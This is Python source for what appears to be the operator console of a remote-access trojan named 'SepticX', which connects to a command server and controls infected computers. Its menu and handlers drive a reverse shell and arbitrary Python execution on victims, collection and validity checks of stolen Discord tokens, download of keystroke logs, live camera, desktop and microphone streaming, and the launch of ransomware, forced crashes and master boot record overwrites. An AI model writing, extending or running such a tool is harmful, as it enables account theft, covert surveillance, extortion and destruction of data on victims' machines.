import multiprocessing, threading, websocket, requests, pyaudio, base64, json, time, glob, cv2, ssl, os, io
from websocket import create_connection
from PIL import Image, ImageTk
from random import randbytes
from termcolor import cprint
import tkinter as tk
os.system("")

class colors():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

class Main:
    def __init__(self):
      self.computers = None
      self.columns = 4
      self.seperate = 10
      self.indent = " " * int((69/self.columns)-7)

      self.uiprint('Enter your server address')
      self.host = input('> ').replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0]

      self.uiprint('Enter your server key')
      self.key = input('> ')

      self.clear()

      threading.Thread(target=self.connect).start()
      self.main()

    def clear(self):
        if os.name == "nt":
          os.system("cls")
        else:
          os.system("clear")

    def uiprint(self, message="", type=None):
        if type == "error":
            print(f"{self.indent}[ ", end="")
            cprint("ERROR", "red", end="")
            print(" ] ", end="")
            cprint(message, "red")

        else:
            print(f"{self.indent}[ ", end="")
            cprint("CONTROLLER", "green", end="")
            print(" ] ", end="")
            cprint(message, "green")

    def connect(self):
        self.ws = create_connection(f"wss://{self.host}/api/ws/computers", sslopt={"cert_reqs": ssl.CERT_NONE})
        ws = self.ws
        ws.send(self.key)

        while True:
            try:
                self.computers = json.loads(ws.recv().replace("'", '"'))["computers"]
            except Exception as e:
                self.ws = create_connection(f"wss://{self.host}/api/ws/computers")
                ws = self.ws
                ws.send(self.key)

    def get_tokens(self):
        tokens = requests.get(f'https://{self.host}/tokens', data={'key': self.key}).json()
        return tokens

    def check(self, token):
        return requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': token}).status_code == 200

    def send_command(self, command, target):
        self.ws.send(json.dumps({
            "code": command,
            "target": target
        }))

    def get_input(self, choose=True):
        uiprint = self.uiprint
        uiprint("Choose a target:")
        print("", end="\n\n")

        if not self.computers:
            uiprint("No available targets.", "error")
            return

        for count, target in enumerate(self.computers):
            print(f"{self.indent}[", end="")
            cprint(str(count+1), "green", end="")
            print("] ", end="")
            print(target, end="\n\n")

        if choose:
            while True:
                try:
                    choice = int(input(f"{self.indent}>>"))
                    return self.computers[choice - 1]
                except:
                  uiprint("Invalid option!", "error")

        else:
            uiprint("Pres Enter to continue")
            input(f"{self.indent}>>")

    class ReverseShell:
        def __init__(self, computer, host, key):
            self.key = key
            self.host = host
            self.computer = computer
            self.ws = self.establishConnection()
            self.start()
        
        def start(self):
            ws = self.ws
            while True:
                try:
                    command = input('>> ')
                except KeyboardInterrupt:
                    break
                
                try:
                    ws.send(command)
                except Exception as e:
                    ws = self.establishConnection()

                timer = threading.Timer(15., ws.close)
                timer.start()

                try:
                    print(ws.recv())
                    timer.cancel()
                except KeyboardInterrupt:
                    break

                except Exception as e:
                    ws = self.establishConnection()

                except websocket._exceptions.WebSocketConnectionClosedException:
                    ws = self.establishConnection()


                if not timer.is_alive:
                    self.ws = self.establishConnection()
                    ws = self.ws
                    print("[SepticX Handler]: Timeour Error Occured")
                    

        def establishConnection(self):
            ws = create_connection(f'wss://{self.host}/api/ws/readShell', sslopt={"cert_reqs": ssl.CERT_NONE})
            ws.send(self.key)
            ws.send(self.computer)
            return ws

    class Audio:
        def __init__(self, target, host, key):
            self.key = key
            self.host = host
            self.Stop = False
            self.target = target
            self.ws = self.establishConnection()
            self.play()

        def play(self):
            chunk = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 8000
            RECORD_SECONDS = 5

            ws = self.ws
            p = pyaudio.PyAudio()

            stream = p.open(format = FORMAT,
                channels = CHANNELS,
                rate = RATE,
                input = True,
                output = True,
                frames_per_buffer = chunk)
            
            try:
                while not self.Stop:
                    stream.write(base64.b64decode(ws.recv()))
            except:
                ws = self.establishConnection()

        def establishConnection(self):
            ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
            ws.send(self.key)
            ws.send(self.target)
            return ws

        def stop(self):
            self.Stop = True

    class Video:
        def __init__(self, target, option, host, key):
            self.key = key
            self.host = host
            self.target = target
            self.Stop = False

            if not option:
                self.endpoint = "showCamera"
            else:
                self.endpoint = "showScreen"

            self.ws = self.establishConnection()
            self.display()

        def update(self, panel):
            start_time = time.time()
            ws = self.ws

            while not self.Stop:

                try:
                    recv_data = ws.recv()
                    data = base64.b64decode(recv_data)

                    f = io.BytesIO(data)
                    pilimage = Image.open(f)
                    img = ImageTk.PhotoImage(pilimage)
                    panel.configure(image=img)
                    panel.image = img
                except KeyboardInterrupt:
                    break

                except Exception as e:
                    print(e)
                    ws = create_connection(f"wss://{self.host}/api/ws/{self.endpoint}", sslopt={"cert_reqs": ssl.CERT_NONE})
                    ws.send(self.key)
                    ws.send(target)

        def display(self):
            window = tk.Tk()
            window.title("SepticX Client")
            window.geometry("300x300")
            window.configure(background='grey')

            ws = create_connection(f"wss://{self.host}/api/ws/{self.endpoint}")
            ws.send(self.key)
            ws.send(self.target)

            ws.recv()
            data = base64.b64decode(ws.recv())

            f = io.BytesIO(data)
            pilimage = Image.open(f)
            img = ImageTk.PhotoImage(pilimage)
            panel = tk.Label(window, image=img)
            panel.pack(side="bottom", fill="both", expand="yes")

            threading.Thread(target=self.update, args=(panel)).start()
            window.mainloop()

        def establishConnection(self):
            ws = create_connection(f"wss://{self.host}/api/ws/{self.endpoint}")
            ws.send(self.key)
            ws.send(self.target)
            return ws

        def stop(self):
            self.Stop = True

    def main(self):
        uiprint = self.uiprint
        columns = self.columns
        length = 15

        options = [
            "Reverse Shell", "Run PY script", "Resend Credentials", 
            "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
            "Stream Desktop","Stream Audio", "Stop Streaming Camera",
            "Stop Streaming Desktop", "Stop Streaming Audio", "Restart Pc", 
            "Start Ransomware", "Start Trollware", "Stop Trollware", 
            "Start BSOD", "Overwrite MBR", "Shutdown Pc", 
            "Logged Tokens", "Logged Keystrokes", "Uninstall Client", "Show Targets"
        ]

        commands = [
            None, None, "sendCreds", 
            "nukeTokens", "updateWebhook:", "streamCamera", 
            "streamDesktop", "streamAudio", "stopDesktop", 
            "stopCamera", "stopAudio", "restart", 
            "startRansomware", "Troll", "stopTroll",
            "bsod", "mbr", "shutdown", 
            None, None, "clean", None
        ]

        while True:

            print("""
                  
                                                                                                  
                        ██████╗  █████╗ ███████╗██╗  ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗     
                        ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗    
                        ██║  ██║███████║███████╗███████║██████╔╝██║   ██║███████║██████╔╝██║  ██║    
                        ██║  ██║██╔══██║╚════██║██╔══██║██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║    
                        ██████╔╝██║  ██║███████║██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝    
                        ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     
========================================================================================================================
Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice B
========================================================================================================================
                                      """.replace("║", f"{colors.GREEN}║{colors.RESET}").replace("╗", f"{colors.GREEN}╗{colors.RESET}").replace("╚", f"{colors.GREEN}╚{colors.RESET}").replace("╝", f"{colors.GREEN}╝{colors.RESET}").replace("═", f"{colors.GREEN}═{colors.RESET}").replace("╔", f"{colors.GREEN}╔{colors.RESET}").replace("|", f"{colors.GREEN}|{colors.RESET}"))

            for count, option in enumerate(options):

                if (count % columns) == 0:
                    print(f"{self.indent}[", end="")
                    cprint(str(count +1 ), "green", end="")
                    print("] ", end="")
                    print(option, end="")

                else:
                    base = len(options[0])
                    space = self.seperate - ( ( len(options[count - 1]) + len(str(count) ) - 1) - base)

                    if not count == 0:
                        print(" " * space, end="")
                    else:
                        print("        ", end="")

                    print("[", end="")
                    cprint(str(count+1), "green", end="")
                    print("] ", end="")
                    print(option, end="")

                if (count % columns) == columns - 1:
                    print("\n")
                
            print("\n\n\n", end="")

            try:
                choice = int(input(f"{self.indent}>>"))
            except (KeyboardInterrupt, EOFError):
                uiprint("Exiting...")
                time.sleep(1)
                os._exit(0)

            except:
                uiprint("Invalid option!", "error")
                time.sleep(1)
                self.clear()
                continue

            if choice == 19:
                tokens = self.get_tokens()
                if not tokens:
                    self.uiprint('No available tokens.', 'error')

                for token in tokens:
                    print(f"Token: {token}")
                
                    if not self.check(token):
                        uiprint('Invalid Token', 'error')
                    else:
                        uiprint('Valid Token!')

                input(">> Press enter to continue")
                time.sleep(1)
                self.clear()
                continue

            elif choice == 20:
                uiprint('Downloading logs...')
                download = requests.get(f'https://{self.host}/logs', data={'key': self.key}).content
                with open('logs.zip', 'wb') as file:
                    file.write(download)

                uiprint("Downloaded logs are in 'logs.zip'")
                time.sleep(1)
                self.clear()
                continue

            elif choice == 22:
                self.get_input(choose=False)
                time.sleep(1)
                self.clear()
                continue

            target = self.get_input()
            command = commands[choice - 1]

            if not target:
                time.sleep(1)
                self.clear()
                continue

            elif command:
                self.send_command(command, target)

            if choice == 1:
                try:
                    self.ReverseShell(target, self.host, self.key)
                except KeyboardInterrupt:
                    pass
                
                self.clear()
                continue

            elif choice == 2:
                while True:
                    try:
                        uiprint("Load from file? (Y or N)")
                        choice = input(f"{self.indent}>>")

                        yes = ['y', 'yes', 'yup', 'yeah']

                        if choice.lower() in yes:
                            uiprint("Type the filename below:")
                            filename = input(f"{self.indent}>>")
                            command = open(filename, "rb").read().decode()

                        else:
                            uiprint("Type the python command below:")
                            command = input(f"{self.indent}>>")

                        break

                    except KeyboardInterrupt:
                        break

                    except Excpetion as e:
                        print(e)
                        uiprint("Invalid filename!", "error")

                self.send_command(command, target)
                uiprint("Sent!")
                time.sleep(1.2)

            elif choice == 5:
                uiprint("Enter your webhook below:")
                print("", end="\n\n")
                webhook = input(f"{self.indent}>>")
                command = f"updateWebhook:{webhook}"
                self.send_command(command, target)

            elif choice == 6:                
                self.Video(target, 0, self.host, self.key)
                
            elif choice == 7:                
                self.Video(target, 1, self.host, self.key)
                
            elif choice == 8:                
                self.Audio(target, self.host, self.key)
            else:
                uiprint('Command Sent!')

            time.sleep(1)
            self.clear()

if __name__ == '__main__':
    Main()